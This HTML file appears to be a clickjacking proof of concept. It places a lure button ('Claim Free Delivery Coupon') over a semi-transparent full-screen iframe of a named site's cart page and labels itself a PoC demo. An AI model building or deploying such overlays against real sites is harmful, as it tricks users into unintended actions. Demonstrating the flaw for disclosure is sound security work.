<!DOCTYPE html>
<html>
<head>
  <title>Salad Days - Exclusive Offer</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #f5f5f5; font-family: sans-serif; }

    #decoy-btn {
      position: fixed;
      bottom: 195px;
      left: 50%;
      transform: translateX(-50%);
      width: 480px;
      padding: 20px;
      font-size: 18px;
      background: #ff6b35;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      z-index: 9999;
      box-shadow: 0 4px 15px rgba(255,107,53,0.4);
    }

    #real-iframe {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      border: none;
      opacity: 0.3;
      z-index: 9998;
    }

    #label {
      position: fixed;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0,0,0,0.7);
      color: white;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      z-index: 10000;
    }
  </style>
</head>
<body>
  <div id="label">PoC Demo — opacity 0.3 so both layers are visible</div>
  <button id="decoy-btn">Claim Free Delivery Coupon</button>
  <iframe id="real-iframe" src="https://www.saladdays.co/cart"></iframe>
</body>
</html>
